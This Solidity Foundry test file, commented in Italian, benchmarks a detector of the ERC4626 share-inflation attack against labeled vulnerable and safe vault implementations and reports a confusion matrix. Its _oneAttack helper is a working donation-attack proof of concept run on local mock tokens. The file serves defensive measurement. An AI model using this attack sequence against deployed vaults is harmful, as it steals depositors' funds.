// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// MATRICE DI CONFUSIONE del detector: implementazioni ETICHETTATE (note-VULN vs note-SAFE), tutte su codice REALE
// (incluso OZ v4.8 storicamente-vulnerabile). Stesso harness parametrico fedele -> TP/TN/FP/FN. Il numero che dice
// "cattura le vulnerabilita VERE?" — senza hunting di exploit live, su pattern di codice riproducibili ed etichettati.
import "forge-std/Test.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {IVault, IMintableERC20} from "../src/IVault.sol";
import {MockToken, VaultBalanceOf, VaultInternal} from "../src/Targets.sol";
import {SoladyVault, OZVault, OZVaultOffset6} from "../src/ShapesExt.sol";
import {OZ48Vault, OZVaultOffset3} from "../src/LabeledShapes.sol";

contract LabeledBench is Test {
    address atk = address(0xA11CE);
    address vic = address(0xB0B);
    uint256 tp; uint256 tn; uint256 fp; uint256 fn;

    function _oneAttack(IVault v, IMintableERC20 t, uint256 V, uint256 D) internal returns (int256 profit, bool blocked) {
        t.mint(atk, 1 + D); t.mint(vic, V);
        vm.startPrank(atk);
        t.approve(address(v), type(uint256).max);
        try v.deposit(1, atk) returns (uint256) {} catch { vm.stopPrank(); return (int256(0), true); }
        t.transfer(address(v), D);
        vm.stopPrank();
        vm.startPrank(vic);
        t.approve(address(v), type(uint256).max);
        try v.deposit(V, vic) returns (uint256) { vm.stopPrank(); } catch { vm.stopPrank(); return (int256(0), true); }
        vm.startPrank(atk);
        uint256 got = v.redeem(v.balanceOf(atk), atk, atk);
        vm.stopPrank();
        profit = int256(got) - int256(1 + D);
    }

    function _maxProfit(function() internal returns (IVault, IMintableERC20) deploy) internal returns (int256 maxP) {
        uint256 V = 100e18;
        uint256[12] memory Ds = [uint256(1e18), 10e18, 25e18, 40e18, 49e18, 50e18,
                                 51e18, 60e18, 75e18, 90e18, 99e18, 100e18];
        maxP = type(int256).min;
        for (uint256 i = 0; i < 12; i++) {
            (IVault v, IMintableERC20 t) = deploy();
            (int256 p, bool b) = _oneAttack(v, t, V, Ds[i]);
            if (!b && p > maxP) maxP = p;
        }
    }

    function _check(string memory name, function() internal returns (IVault, IMintableERC20) deploy, bool expectVuln) internal {
        int256 maxP = _maxProfit(deploy);
        bool gateVuln = maxP > 0;
        string memory verdict = gateVuln ? "VULN" : "IMMUNE";
        string memory hit;
        if (gateVuln && expectVuln) { tp++; hit = "TP"; }
        else if (!gateVuln && !expectVuln) { tn++; hit = "TN"; }
        else if (gateVuln && !expectVuln) { fp++; hit = "FP<<"; }
        else { fn++; hit = "FN<<"; }
        emit log_string(string.concat("RESULT ", name, " label=", expectVuln ? "VULN" : "SAFE",
            " gate=", verdict, " maxProfit=", vm.toString(maxP), " -> ", hit));
    }

    // deployers (l'unica parte per-forma)
    function _dSolmateBal() internal returns (IVault, IMintableERC20) { MockToken t = new MockToken(); return (IVault(address(new VaultBalanceOf(ERC20(address(t))))), IMintableERC20(address(t))); }
    function _dOZ48() internal returns (IVault, IMintableERC20) { MockToken t = new MockToken(); return (IVault(address(new OZ48Vault(address(t)))), IMintableERC20(address(t))); }
    function _dSolmateInt() internal returns (IVault, IMintableERC20) { MockToken t = new MockToken(); return (IVault(address(new VaultInternal(ERC20(address(t))))), IMintableERC20(address(t))); }
    function _dSolady() internal returns (IVault, IMintableERC20) { MockToken t = new MockToken(); return (IVault(address(new SoladyVault(address(t)))), IMintableERC20(address(t))); }
    function _dOZ0() internal returns (IVault, IMintableERC20) { MockToken t = new MockToken(); return (IVault(address(new OZVault(address(t)))), IMintableERC20(address(t))); }
    function _dOZ3() internal returns (IVault, IMintableERC20) { MockToken t = new MockToken(); return (IVault(address(new OZVaultOffset3(address(t)))), IMintableERC20(address(t))); }
    function _dOZ6() internal returns (IVault, IMintableERC20) { MockToken t = new MockToken(); return (IVault(address(new OZVaultOffset6(address(t)))), IMintableERC20(address(t))); }

    function testLabeledConfusion() public {
        // note-VULNERABILI (codice reale)
        _check("solmate_balanceof", _dSolmateBal, true);
        _check("oz_v4.8_no_vshares", _dOZ48, true);
        // note-SAFE (codice reale)
        _check("solmate_internal", _dSolmateInt, false);
        _check("solady_vshares", _dSolady, false);
        _check("oz5_offset0", _dOZ0, false);
        _check("oz5_offset3", _dOZ3, false);
        _check("oz5_offset6", _dOZ6, false);

        uint256 total = tp + tn + fp + fn;
        uint256 recallPct = (tp + fn) == 0 ? 0 : (tp * 100) / (tp + fn);
        uint256 precPct = (tp + fp) == 0 ? 100 : (tp * 100) / (tp + fp);
        emit log_string(string.concat("CONFUSION total=", vm.toString(total),
            " TP=", vm.toString(tp), " TN=", vm.toString(tn), " FP=", vm.toString(fp), " FN=", vm.toString(fn)));
        emit log_string(string.concat("METRICS recall=", vm.toString(recallPct), "% precision=", vm.toString(precPct), "%"));
        // detector perfetto atteso su questo set pulito: 0 FP, 0 FN
        assertEq(fp, 0, "FALSO POSITIVO: gate ha gridato VULN su un SAFE -> verifica");
        assertEq(fn, 0, "FALSO NEGATIVO: gate ha MANCATO un VULN reale -> verifica");
    }
}
